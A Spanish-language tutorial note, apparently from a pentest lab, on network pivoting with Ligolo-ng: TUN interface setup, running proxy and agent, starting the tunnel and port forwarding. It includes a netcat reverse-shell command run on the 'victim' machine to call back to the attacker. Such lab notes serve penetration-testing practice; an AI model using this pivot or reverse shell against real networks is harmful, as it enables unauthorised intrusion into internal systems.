**Ligolo-ng** es una herramienta avanzada y simple para realizar tunelización y pivoting en redes. Utiliza una interfaz TUN para crear un stack de red en el espacio de usuario, permitiendo el enrutamiento de tráfico a través de redes comprometidas sin la necesidad de proxies SOCKS

```
https://github.com/nicocha30/ligolo-ng/
```

```
https://www.youtube.com/watch?v=Kimrp9WZPTU
```

# Preparación entorno
![[Pasted image 20240715114120.png]]

# Instalación ligolo
Primero descargamos los ficheros y los descomprimimos
Archivo Proxy
```
7z x ligolo-ng_proxy_0.6.2_linux_arm64.tar.gz
7z x ligolo-ng_proxy_0.6.2_linux_arm64.tar
```

Archivo Agente
```
7z x ligolo-ng_agent_0.6.2_linux_arm64.tar.gz
7z x ligolo-ng_agent_0.6.2_linux_arm64.tar
```

![[Pasted image 20240715114152.png]]
# Crear interfaz de red
```Bash
sudo ip tuntap add user $USER mode tun ligolo
```
![[Pasted image 20240715072848.png]]
- `sudo`: Ejecuta el comando con privilegios de superusuario.
- `ip tuntap`: Es la utilidad que se utiliza para crear, configurar y eliminar interfaces TUN/TAP.
- `add`: Indica que se va a añadir una nueva interfaz.
- `user $user`: Especifica el nombre del usuario que tendrá acceso a la interfaz. `$user` es una variable que contiene el nombre del usuario.
- `mode tun`: Especifica el modo de la interfaz. En este caso, `tun` significa que se está creando una interfaz TUN, que se usa para tunelizar paquetes de nivel 3 (IP).
- `ligolo`: Es el nombre asignado a la nueva interfaz TUN. Este nombre es arbitrario y puede ser cualquier nombre válido para una interfaz de red.

Comprobamos que esta creada con el nombre de ligolo
![[Pasted image 20240715104109.png]]

# Levantar interfaz de red
```
sudo ip link set ligolo up
```
![[Pasted image 20240715073030.png]]
![[Pasted image 20240715102319.png]]

# Revisamos la tabla de enrutamiento
```
ip route
```
![[Pasted image 20240715073346.png]]

# Añadir ruta de red en interfaz
```Bash
sudo ip route add 10.10.10.0/24 dev ligolo
```
![[Pasted image 20240715073924.png]]

Comprobamos que se haya añadido
![[Pasted image 20240715102254.png]]
- `ip`: Es el comando principal para la configuración de red en sistemas Linux.
- `route`: Este subcomando de `ip` se utiliza para manipular la tabla de enrutamiento del kernel.
- `add`: Esta acción indica que se está añadiendo una nueva ruta a la tabla de enrutamiento.
- `10.10.10.0/24`: Es la red de destino a la que se desea agregar una ruta. En este caso, se especifica la red `10.10.10.0` con una máscara de subred `/24`, lo que significa que la máscara de red es `255.255.255.0`.
- `dev ligolo`: Especifica la interfaz de red a través de la cual se debe enrutar el tráfico hacia la red de destino. En este caso, `ligolo` es el nombre de la interfaz de red.


# Asignar permisos a binario proxy
Primero asignamos permisos de ejecución al binario de ligolo
```
chmod +x proxy
```
![[Pasted image 20240715074323.png]]

# Ejecutar ligolo
```
./proxy -selfcert
```
![[Pasted image 20240715074523.png]]

# Conectarse con maquina intermediaria
Primero damos los permisos al binario en la maquina victima
```
chmod +x ./agent
```
![[Pasted image 20240715114345.png]]

Y ahora ejecutamos el binario para conectarnos
```Bash
./agent -connect 192.168.1.2:11601 -ignore-cert
```
![[Pasted image 20240715114429.png]]

Volvemos a nuestra maquina atacante y ya la vemos conectada
![[Pasted image 20240715114449.png]]

Ahora para crear el tunel tendremos que conectarnos a la sesion
```
session
'seleccionamos el tunel'
start
```
![[Pasted image 20240715114513.png]]

Como podemos ver ya tendriamos acceso a la maquina de la subred a la que no teniamos acceso
![[Pasted image 20240715114536.png]]

Y ya tendriamos acceso a la subred a la cual queremos hacer pivoting, el problema ahora es que nosotros tenemos acceso a las maquinas del segmento de red al cual antes no teniamos acceso pero esas maquinas no pueden vernos, esto es un problema para la transferencia de archivos o generarnos una reverse shell, para solucionar esto realizaremos portforwarding desde la terminal de ligolo, para ello ejecutaremos el siguiente comando en la terminal de ligolo
```
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```
![[Pasted image 20240715114613.png]]

Lo verificamos
```
listener_list
````
![[Pasted image 20240715114631.png]]

Y ahora ya podrian vernos desde la ip de la maquina intermediaria por el puerto 8080, si iniciaramos un servidor desde nuestra maquina podriamos descargarlo con el siguiente comando
```
wget 192.168.10.13:8080/test.txt
```
![[Pasted image 20240715115200.png]]

Si comprobamos en nuestra maquina de kali veremos como aparecere la conexión
![[Pasted image 20240715115238.png]]

Y podremos generarnos una reverse shell, para ello nos ponemos en escucha por el puerto configurado
![[Pasted image 20240715115451.png]]

Y ejecutamos netcat en la maquina victima
```
nc 10.10.10.13 8080 -e /bin/bash 
```
![[Pasted image 20240715115600.png]]


-------
# Configurar varias redirecciones de puertos
Podemos tener mas de un puerto configurado
![[Pasted image 20240715115401.png]]
# Conecxión agent desde maquina windows
Si la maquina intermediaria fuera Windows el comando seria el siguiente
```Powershell
.\agent.exe -connect 192.168.0.14:11601 -ignore-cert
```


------------
# Eliminar interfaz de red
```
sudo ip link delete ligolo
```



-----
# Solucionar error
Cuando suspendemos el servicio pero sigue escuchando como vemos en la siguiente imagen
![[Pasted image 20240715103525.png]]

Tenemos que verificar el proceso que este abierto
```
netstat -tulpn
```
![[Pasted image 20240715103620.png]]

```
sudo kill -9 7042
```
![[Pasted image 20240715103708.png]]

Y si ahora lo revisamos ya no esta activo
![[Pasted image 20240715103742.png]]